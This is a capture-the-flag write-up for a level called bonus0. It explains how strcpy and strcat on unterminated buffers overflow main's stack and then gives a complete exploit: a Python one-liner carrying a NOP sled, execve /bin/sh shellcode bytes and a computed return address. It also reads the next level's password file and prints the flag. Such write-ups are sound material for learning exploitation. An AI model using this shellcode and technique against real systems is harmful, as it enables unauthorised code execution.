solution bonus0:

-> the main holds a buffer of 42 bytes on the stack, and sends it as argument to the "pp" function (we'll call that buffer "buff")

-> "pp" holds 2 buffers of 20 bytes each, which we'll call "str1" and "str2"

-> "pp" calls function "p" with "str1" as argument and then with "str2" as argument

-> "p" holds a buffer of 4096 bytes, and fills it with input from stdin by calling the read method

-> after reading the input it searches for a newline character and replaces it with a terminating null character

-> finally it copies the first 20 bytes of the buffer to the string sent as argument

-> after these 2 calls to "p", "pp" uses the strcpy method with main's "buff" as destination and "str1" as source

-> it then appends a space at the end of "buff" and concatenates "str2" to "buff" with the strcat method

-> we are going to overflow "buff" to reach the saved eip of main
main stack state:
- saved eip	4 bytes
- saved ebp	4 bytes
- alignment	8 bytes
- buffer	42 bytes
we will overwrite the saved eip if we reach buff[54]

-> now we need to carefully choose the input which will be read in "p":
The first input will fill p's buffer with 20 bytes + a NOP sled + a shellcode.
The second input will be 19 bytes, with the address to replace eip with.

first input = AAAAAAAAAAAAAAAAAAAA+NOP-sled+shellcode	(20+ bytes)
second input = BBBBBBBBBBBBBBXXXXB			(19 bytes, containing payload return address)

-> strcpy(buff, str1) results in "buff" containing 39 characters, because "str1" is not a NULL-terminated string and so "str2" will be copied as well :
buff = "AAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBXXXXB"

-> after a space is appended to "buff", it contains 40 chars :
buff = "AAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBXXXXB "

-> strcat(buff, str2) appends 19 chars, so the buffer now contains 59 chars :
buff = "AAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBXXXXB BBBBBBBBBBBBBBXXXXB"

-> "buff" will therefore overwrite the return address of main with the address XXXX

-> our shellcode is in p's buffer preceded by 20 'A's and a NOP sled of 1000 bytes
p's buffer is on the stack, and the address we see with gdb is 0xbfffe650. However outside of gdb the address might differ by a few bytes because the stack is different (environment variables and arguments). Therefore we need a NOP sled since we do not know the exact address of the shellcode; we can simply transfer the execution flow to anyplace within the NOP sled and it will "slide" the CPU’s instruction execution flow to the shellcode.
target return address: 0xbfffe650 + 20 + 500 (middle of the NOP-sled) = 0xbfffe858

> (python -c "print('A' * 20 + '\x90' * 1000 + '\x31\xd2\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x31\xc0\xb0\x0b\x89\xe3\x83\xe4\xf0\xcd\x80')"; python -c "print('B' * 14 + '\x58\xe8\xff\xbf' + 'B')"; cat) | ./bonus0
> cat /home/user/bonus1/.pass
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
